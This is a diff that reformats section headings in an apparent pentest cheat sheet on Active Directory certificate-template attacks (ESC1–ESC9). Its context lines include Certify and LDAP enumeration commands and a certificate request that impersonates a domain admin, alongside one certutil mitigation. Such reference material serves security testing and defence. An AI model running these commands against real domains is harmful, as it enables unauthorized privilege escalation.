@@ -2391,12 +2391,15 @@ pyrdp-mitm.py <IP> -k private_key.pem -c certificate.pem # with custom key and c
 
 > Domain Users can enroll in the **VulnTemplate** template, which can be used for client authentication and has **ENROLLEE_SUPPLIES_SUBJECT** set. This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name (i.e. as a DA). Allows additional identities to be bound to a certificate beyond the Subject.
 
-Requirements:
-*  Template that allows for AD authentication
+**Requirements**
+
+* Template that allows for AD authentication
 * **ENROLLEE_SUPPLIES_SUBJECT** flag
 * [PKINIT] Client Authentication, Smart Card Logon, Any Purpose, or No EKU (Extended/Enhanced Key Usage) 
 
-Exploitation:
+
+**Exploitation**
+
 * Use [Certify.exe](https://github.com/GhostPack/Certify) to see if there are any vulnerable templates
     ```ps1
     Certify.exe find /vulnerable
@@ -2429,10 +2432,12 @@ Exploitation:
 
 ### ESC2 - Misconfigured Certificate Templates
 
-Requirements:
-*  Allows requesters to specify a Subject Alternative Name (SAN) in the CSR as well as allows Any Purpose EKU (2.5.29.37.0)
+**Requirements**
 
-Exploitation:
+* Allows requesters to specify a Subject Alternative Name (SAN) in the CSR as well as allows Any Purpose EKU (2.5.29.37.0)
+
+**Exploitation**
+
 * Find template
   ```ps1
   PS > Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=megacorp,DC=local'
@@ -2490,7 +2495,8 @@ certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe06709
 
 > If this flag is set on the CA, any request (including when the subject is built from Active Directory) can have user defined values in the subject alternative name. 
 
-Exploitation:
+**Exploitation**
+
 * Use [Certify.exe](https://github.com/GhostPack/Certify) to check for **UserSpecifiedSAN** flag state which refers to the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag.
     ```ps1
     Certify.exe cas
@@ -2500,13 +2506,15 @@ Exploitation:
     .\Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:User /altname:DomAdmin
     ```
 
-Mitigation:   
-* Remove the flag : `certutil.exe -config "CA01.domain.local\CA01" -setreg "policy\EditFlags" -EDITF_ATTRIBUTESUBJECTALTNAME2`
+**Mitigation**
+
+* Remove the flag: `certutil.exe -config "CA01.domain.local\CA01" -setreg "policy\EditFlags" -EDITF_ATTRIBUTESUBJECTALTNAME2`
 
 
 ### ESC7 - Vulnerable Certificate Authority Access Control
 
-Exploitation:
+**Exploitation**
+
 * Detect CAs that allow low privileged users the `ManageCA`  or `Manage Certificates` permissions
     ```ps1
     Certify.exe find /vulnerable
@@ -2626,7 +2634,8 @@ Require [Impacket PR #1101](https://github.com/SecureAuthCorp/impacket/pull/1101
 
 ### ESC9 - No Security Extension
 
-Requirements:
+**Requirements**
+
 * `StrongCertificateBindingEnforcement` set to `1` (default) or `0`
 * Certificate contains the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag` value
 * Certificate specifies `Any Client` authentication EKU
